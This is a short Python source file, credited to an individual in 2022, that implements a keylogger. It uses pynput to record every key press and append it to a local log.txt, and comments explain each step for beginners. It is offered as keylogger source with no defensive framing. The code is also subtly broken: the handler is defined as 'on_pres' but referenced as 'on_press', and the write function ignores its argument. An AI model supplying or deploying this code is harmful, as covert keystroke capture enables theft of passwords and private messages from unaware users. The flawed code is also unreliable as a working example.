######################################
#Copyright of David lenvake, 2022             
######################################

from pynput.keyboard import Listener

count=0
keys=[]

def on_pres(key): #cause from our keyboard, going to get the key presses
    global count, keys
    keys.append(key)
    count += 1 #every time a key is pressed its gonna add up into the keys
    if count >= 1:
        count = 0
        write_file(keys) #write the list of keys that we are going to provide
        keys = []

def write_file(key):
    with open("log.txt","a") as f:
        for key in keys: #every key that is going to be pressed within this list of keys
            k = str(key).replace("'", "") #--> call them as k and convert them into a string | and to replace those single qoutes with nothing.
            if k.find("space") > 0: #to see if someone is pressing spacebar,shift,tab... 
                f.write(' ')
            elif k.find("tab") > 0:
                f.write('   ')
            elif k.find("enter") > 0:
                f.write('\n')
            elif k.find("shift") > 0:
                f.write(' shift ')
            elif k.find("capslock") > 0:
                f.write(' capslock ')
            elif k.find("key") == -1:
                f.write(k)


with Listener(on_press=on_press) as listener: #whenever you press a key, consider it as a key press. / and record it as listener
    listener.join() 
